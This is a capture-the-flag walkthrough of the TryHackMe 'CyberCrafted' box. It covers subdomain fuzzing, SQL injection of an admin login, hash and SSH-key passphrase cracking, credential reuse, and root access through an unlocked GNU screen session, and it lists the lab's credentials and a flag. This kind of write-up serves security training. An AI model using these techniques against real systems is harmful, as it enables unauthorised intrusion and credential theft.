---
title: "CyberCrafted"
type: docs
tags:
  - thm
  - linux
  - medium
  - sqli
  - minecraft
  - john
  - screen
---

<div class="callout callout-info">

**Box Info**

**Platform:** TryHackMe, **OS:** Linux, **Difficulty:** Medium, **IP:** 10.10.131.89 (`cybercrafted.thm`)

</div>

<div class="callout callout-abstract">

**Attack Path**

1. vhost fuzz → `admin.cybercrafted.thm`, `store.` (403). Also a **Minecraft** server on 25565.
2. `admin.` login is **SQL-injectable** → dump `webapp.admin` → `xXUltimateCreeperXx:diamond123456789` (SHA1) + `THM{...}` web flag.
3. `admin.cybercrafted.thm/panel.php` has a command box → **RCE** → grab `xxultimatecreeperxx`'s SSH key → crack with `john` (`creepin2006`) → SSH.
4. `/opt/minecraft/.../LoginSystem/passwords.yml` → `madrinch` MD5 = `Password123`; `settings.yml` → `bukkit:walrus`. Reuse → `su cybercrafted`.
5. `cybercrafted` runs the MC server inside **GNU screen** as root, `screen -x` / `Ctrl-A :` into the root session → root.

</div>

<div class="callout callout-key">

**Credentials**

- `xXUltimateCreeperXx` : `diamond123456789`
- SSH key passphrase: `creepin2006`
- `madrinch` (MD5 `42f749...`) : `Password123`
- DB (settings.yml): `bukkit` : `walrus`

</div>

---

## Full Walkthrough

As always, I started with a full TCP scan against the target to get a baseline picture of what was actually running before deciding where to focus first.

```console
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| vulners: [output trimmed - CVE reference dump]
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|_  /secret/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_http-dombased-xss: Couldn't find any DOM based XSS.
| vulners: [output trimmed - CVE reference dump]
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Port 80 didn't hand me any obvious low-hanging fruit beyond a `/secret/` listing worth remembering for later, but the box's whole Minecraft theme told me there was almost certainly a game server sitting outside the usual web ports. I scanned specifically for the default Minecraft port to confirm it:

```console
❯ nmap -A 10.10.131.89 -p25565
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-29 22:13 EST
Nmap scan report for cybercrafted.thm (10.10.131.89)
Host is up (0.094s latency).
```

```console
PORT      STATE SERVICE   VERSION
25565/tcp open  minecraft Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r  ck00r, Users: 0/1)
```

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.74 seconds
❯ k1b0r@pwned~/thm/CyberCrafted took 6s 


With the open ports mapped out, my next move was checking whether this site spread across more than one vhost, since a single `/secret/` listing on the base domain wasn't much to work with on its own:

❯ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cybercrafted.thm/ -H "Host: FUZZ.cybercrafted.thm" -fc 404,302,403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \,__\\ \,__\/\ \/\ \ \ \,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cybercrafted.thm/
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.cybercrafted.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 404,302,403
________________________________________________

www                     [Status: 200, Size: 832, Words: 236, Lines: 35, Duration: 98ms]
admin                   [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 130ms]
www.admin               [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 99ms]
[WARN] Caught keyboard interrupt (Ctrl-C)


That first filter was too aggressive and hid `store` behind the same noise as everything else, so I loosened it and reran the fuzz to make sure I wasn't missing anything:

 ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cybercrafted.thm/ -H "Host: FUZZ.cybercrafted.thm" -fc 404,302

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \,__\\ \,__\/\ \/\ \ \ \,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cybercrafted.thm/
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.cybercrafted.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 404,302
________________________________________________

www                     [Status: 200, Size: 832, Words: 236, Lines: 35, Duration: 99ms]
store                   [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 91ms]
admin                   [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 510ms]

`admin.cybercrafted.thm` looked like the natural next target, and testing its login form for SQL injection paid off almost immediately. Once I'd confirmed the injection point, I let `sqlmap` take over and enumerate what was actually sitting behind it:

```console
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] webapp
```

`webapp` was clearly the application's own database rather than something built into MySQL, so I dug into it specifically and found two tables sitting inside:

Database: webapp
[2 tables]
+-------+
| admin |
| stock |
+-------+

`admin` was the obvious one worth pulling apart first, so I checked its column structure before dumping anything out of it:

Database: webapp
Table: admin
[3 columns]
+--------+------------------+
| Column | Type             |
+--------+------------------+
| user   | varchar(32)      |
| hash   | varchar(64)      |
| id     | int(10) unsigned |
+--------+------------------+

With the schema confirmed, dumping the table's actual contents handed back both a user hash and, unexpectedly, a flag sitting in the same table:

```console
+----+------------------------------------------+---------------------+
| id | hash                                     | user                |
+----+------------------------------------------+---------------------+
| 1  | 88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01 | xXUltimateCreeperXx |
| 4  | THM{bbe315906038c3a62d9b195001f75008}    | web_flag            |
+----+------------------------------------------+---------------------+
```

That SHA1 hash didn't take long to crack against a standard wordlist, which gave me a working login:

xXUltimateCreeperXx:diamond123456789

Logging into `admin.cybercrafted.thm` with those same credentials got me into the admin panel, which exposed a page at:

http://admin.cybercrafted.thm/panel.php

That panel had a command execution box on it, about as direct an RCE primitive as it gets, so rather than pop a full reverse shell right away I used it first to grab a copy of `xXUltimateCreeperXx`'s SSH private key. With the private key in hand, the passphrase was the only thing standing between me and a proper SSH session, so I ran it through `john`:

❯ john --wordlist=/opt/SecLists/Passwords/rockyou.txt ./ssh
[pwned:458818] [[63722,0],0] ORTE_ERROR_LOG: Data unpack would read past end of buffer in file util/show_help.c at line 501
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
creepin2006      (ir_rsa)
1g 0:00:01:13 37.87% (ETA: 23:06:07) 0.01357g/s 75527p/s 75527c/s 75527C/s mickaela2..micka2006
Session aborted

That cracked in just over a minute, handing me the passphrase I needed to unlock the key and SSH in as `xxultimatecreeperxx`. Once I was in, I started poking around the Minecraft server directory that gives this box its theme:

xxultimatecreeperxx@cybercrafted:/opt/minecraft$ cat note.txt 
Just implemented a new plugin within the server so now non-premium Minecraft accounts can game too! :)
- cybercrafted

P.S
Will remove the whitelist soon.

The note's mention of a login plugin and a soon-to-be-removed whitelist pointed me straight at the `LoginSystem` plugin directory, so that's where I went next:

xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ ls
language.yml  log.txt  passwords.yml  settings.yml
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat passwords.yml 
cybercrafted: dcbf543ee264e2d3a32c967d663e979e
madrinch: 42f749ade7f9e195bf475f37a44cafcb

The `cybercrafted` hash didn't crack for me in the time I gave it, but `madrinch`'s MD5 fell quickly:

madrinch: 42f749ade7f9e195bf475f37a44cafcb = Password123

While I was already in that plugin directory, I also checked `settings.yml`, since Bukkit plugins frequently store their own database credentials right alongside everything else:

database:
  username: bukkit
  isolation: SERIALIZABLE
  driver: org.sqlite.JDBC
  password: walrus
  url: jdbc:sqlite:{DIR}{NAME}.db

Between `madrinch`'s cracked password and that database credential, one of them was worth trying against the box's own `cybercrafted` system account, and it paid off:

```console
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ su cybercrafted
Password: 
cybercrafted@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ 
```

One other detail worth noting from poking around the server files along the way was a

JavaEdition>Bedrock

compatibility note, though it didn't end up mattering for the privilege escalation itself. What did matter was how the Minecraft server process was actually being run: `cybercrafted` had it started inside a **GNU screen** session owned by root, and attaching to someone else's `screen` session doesn't need an exploit, just permission to reach the socket. Once I confirmed I could attach, I hit

ctrl + a + c root ;3

inside that session to spin up a brand-new window, which inherited root's environment since the whole `screen` instance belonged to root in the first place. That was root: no exploit required, just a multiplexer session someone forgot to lock down.
